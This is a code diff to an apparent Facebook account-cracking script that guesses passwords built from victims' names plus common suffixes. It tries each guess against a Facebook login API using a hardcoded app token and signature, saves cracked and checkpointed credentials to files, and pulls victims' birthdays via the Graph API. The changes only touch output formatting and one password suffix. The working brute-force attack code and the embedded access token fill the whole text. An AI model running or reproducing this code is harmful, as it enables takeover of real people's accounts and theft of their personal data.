@@ -679,7 +679,7 @@ class crackmenu:
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             response = requests.get(api, params=params, headers=headers_)
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print("\r%s[Al3X-OK] %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s" % (H, user, pw, N))
+                print("%s[Al3X-OK] %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s" % (H, user, pw, N))
                 wrt = '%s | %s ' % (user, pw)
                 ok.append(wrt)
                 open('Cracked/okz.txt', 'a').write('%s\n' % wrt)
@@ -691,7 +691,7 @@ class crackmenu:
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                     az = json.loads(ak.text)
                     dob = az['birthday'].replace('/', '-')
-                    print("\r%s[AL3X-CP] \033[1;31m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s" % (K, user, pw, dob, N))
+                    print("%s[AL3X-CP] \033[1;31m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s  %s" % (K, user, pw, dob, N))
                     wrt = '%s | %s | %s' % (user, pw, dob)
                     cp.append(wrt)
                     open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -700,7 +700,7 @@ class crackmenu:
                     dob = ''
                 except:
                     pass
-                print("\r%s[AL3X-CP]\033[1;31m %s \xe2\x9e\xa4 %s                 %s" % (K, user, pw, N))
+                print("%s[AL3X-CP]\033[1;31m %s \xe2\x9e\xa4 %s  %s" % (K, user, pw, N))
                 wrt = '%s | %s ' % (user, pw)
                 cp.append(wrt)
                 open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -717,19 +717,19 @@ class crackmenu:
                     xz = zz[1].split(' ')
                     if len(xz) >= 6:
                         pws = [
-                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '786', xz[0] + ' ' + xz[1] + ' ' + xz[2] + ' ' + xz[3] + ' ' + xz[4]]
+                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '12', xz[0] + ' ' + xz[1] + ' ' + xz[2] + ' ' + xz[3] + ' ' + xz[4]]
                     elif len(xz) <= 1:
                         pws = [
-                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '786', xz[0] + ' ' + xz[1]]
+                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '12', xz[0] + ' ' + xz[1]]
                     elif len(xz) <= 2:
                         pws = [
-                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '786', xz[0] + ' ' + xz[1]]
+                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '12', xz[0] + ' ' + xz[1]]
                     elif len(xz) <= 3:
                         pws = [
-                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '786', xz[0] + ' ' + xz[1] + ' ' + xz[2]]
+                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '12', xz[0] + ' ' + xz[1] + ' ' + xz[2]]
                     elif len(xz) <= 4:
                         pws = [
-                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '786', xz[0] + ' ' + xz[1] + ' ' + xz[2] + ' ' + xz[3]]
+                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + '12', xz[0] + ' ' + xz[1] + ' ' + xz[2] + ' ' + xz[3]]
                     elif len(xz) <= 3:
                         pws = [
                          '123456', 'i love you', '786786', '223344', '102030']
